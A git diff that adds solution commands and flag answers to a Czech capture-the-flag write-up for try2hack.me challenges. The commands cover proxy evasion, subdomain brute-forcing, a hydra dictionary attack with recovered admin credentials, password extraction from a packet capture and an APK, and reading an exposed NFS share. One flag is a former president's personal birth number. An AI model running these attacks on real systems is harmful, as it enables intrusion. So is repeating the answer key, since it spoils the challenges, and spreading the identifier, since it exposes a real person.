@@ -95,12 +95,18 @@ Na [této](https://try2hack.me/AdminPanel.php) adrese se nachází administrace,
 
 ### Postup řešení
 
+```bash
+# https://www.proxynova.com/proxy-server-list/country-za/
+
+curl -x 41.135.120.70:8080 -L https://try2hack.me/AdminPanel.php
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+Wi3ft0Wpizh8cV
 ```
 
 ---
@@ -166,12 +172,27 @@ Na našem serveru, na kterém se momentálně nacházíš, existuje několik skr
 
 ### Postup řešení
 
+```bash
+function find-subdomain() {
+	for c1 in {a..z} {0..9}; do
+		for c2 in {a..z} {0..9}; do
+			{
+				for c3 in {a..z} {0..9}; do
+					curl http://${c1}${c2}${c3}.try2hack.me 2>/dev/null | grep -i password
+				done
+			} | grep -i password && return 0
+			wait
+		done
+	done
+} 2>/dev/null
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+Bir63Fpw0d9MX
 ```
 
 ---
@@ -187,12 +208,14 @@ Tajné heslo se shoduje s rodným číslem prezidenta České republiky Miloše 
 
 ### Postup řešení
 
+[neviditelna.rozhlas.cz](https://neviditelna.rozhlas.cz/socialni-site-digitalni-stopa-zustava-i-kdyz-sva-data-chranite-6821509)
+
 ---
 
 ### Flag:
 
 ```
-temp
+440928/086
 ```
 
 ---
@@ -250,12 +273,16 @@ Dokázal jsi proniknout do sítě významné společnosti, kde jsi zapnul sniffe
 
 ### Postup řešení
 
+```bash
+tshark -O SIP -nr ./netdump.pcap -qx | grep -A 2 -B 1 s.w.o.r.d | tr -d '.' | sed 's/.*   //' | tr -d '\n'
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+mNhr6sW9cs0sD4sVoVpwjf6C
 ```
 
 ---
@@ -265,18 +292,24 @@ temp
 
 ### Zadání:
 
-Tajné heslo pro splnění tohoto úkolu je schované v heslem chráněné administraci. Podaří se ti do ní dostat pomocí slovníkového útoku?
+Tajné heslo pro splnění tohoto úkolu je schované v heslem chráněné [administraci](https://try2hack.me/manage/). Podaří se ti do ní dostat pomocí slovníkového útoku?
 
 ---
 
 ### Postup řešení
+
+```bash
+hydra -s 443 -S -V -l admin -P ./rockyou.txt -e s -t 30 -m /manage/ try2hack.me https-get
+# [443][http-get] host: try2hack.me   login: admin   password: falcon
+curl https://admin:falcon@try2hack.me/manage/
+```
 
 ---
 
 ### Flag:
 
 ```
-temp
+Veinsg5Vskg2Fpcb
 ```
 
 ---
@@ -322,12 +355,17 @@ Získal jsi přístup k telefonu oběti, přičemž tvým cílem je průnik do v
 
 ### Postup řešení
 
+```bash
+docker run -v $(pwd):/apk duolabs/apk2java /apk/findmypass.apk
+grep -A5 -R -i pass ./findmypass.apk.src/ | grep -i '"'
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+Secure1369Pass
 ```
 
 ---
@@ -343,12 +381,18 @@ Správce serveru, na kterém se právě nacházíš, používá ke sdílení dat
 
 ### Postup řešení
 
+```bash
+sudo mount -t nfs try2hack.me:$(showmount -e try2hack.me | tail -n 1 | awk '{ print $1 }') ./tmp/
+cat ./tmp/Password.txt
+sudo umount ./tmp
+```
+
 ---
 
 ### Flag:
 
 ```
-temp
+Ciw27xDowP20eXnv
 ```
 
 ---
